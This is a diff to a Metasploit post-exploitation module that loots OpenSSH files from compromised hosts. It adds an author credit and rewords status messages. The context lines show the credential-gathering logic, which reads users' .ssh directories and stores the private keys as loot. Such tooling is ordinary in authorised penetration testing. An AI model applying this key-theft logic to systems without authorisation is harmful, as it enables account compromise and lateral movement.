@@ -20,9 +20,12 @@ class MetasploitModule < Msf::Post
           downloaded. This module is largely based on firefox_creds.rb.
         },
         'License' => MSF_LICENSE,
-        'Author' => ['Jim Halfpenny'],
+        'Author' => [
+          'Jim Halfpenny',
+          'g0tmi1k' # @g0tmi1k - additional features
+        ],
         'Platform' => %w[bsd linux osx unix],
-        'SessionTypes' => ['meterpreter', 'shell' ],
+        'SessionTypes' => ['meterpreter', 'shell'],
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -62,7 +65,7 @@ class MetasploitModule < Msf::Post
       print_status("Looting #{path} directory")
 
       unless executable?(path)
-        print_warning("Cannot access directory: #{path} . Missing execute permission. Skipping.")
+        print_warning("Cannot access directory: #{path} - Missing execute permission")
         next
       end
 
@@ -83,7 +86,7 @@ class MetasploitModule < Msf::Post
         file_path = "#{path}#{sep}#{file}"
 
         unless readable?(file_path)
-          print_warning("Cannot read file: #{file_path} . Missing read permission. Skipping.")
+          print_warning("Cannot read file: #{file_path} - Missing read permission")
           next
         end
 
@@ -91,7 +94,7 @@ class MetasploitModule < Msf::Post
         file = file.split(sep).last
 
         loot_path = store_loot("ssh.#{file}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
-        print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
+        print_good("Downloaded: #{path}#{sep}#{file} -> #{loot_path}")
 
         # store only ssh private keys
         next if SSHKey.valid_ssh_public_key? data
